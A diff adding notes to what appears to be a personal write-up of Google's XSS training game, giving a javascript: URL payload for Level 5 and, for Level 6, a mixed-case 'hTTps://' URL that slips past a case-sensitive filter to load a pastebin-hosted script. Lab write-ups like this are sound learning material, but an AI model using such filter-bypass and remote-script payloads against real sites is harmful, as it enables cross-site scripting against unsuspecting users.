@@ -72,5 +72,14 @@ https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('unsafe')
 ```
 
 Level 6:
-TODO
+
+* Opening target code showed how the includeGadget program sanitizes the url given in the anchor
+* ```if (url.match(/^https?:\/\//))``` only matches agains either http:// or https:// in the url, but it's not case sensitive. Variations like hTTps:// or HTTPS:// will not match
+* Pastebin can host a js script that calls the alert function
+* Making the anchor hTTps://pastebin.com/Bg2Y5jAY does not seem to make the program execute. The gadget only needs the file, not the pastebin webpage, so changing it to the download link would fix that.
+
+URL anchor to execute xss:
+```raw
+hTTps://pastebin.com/dl/Bg2Y5jAY
+```
 
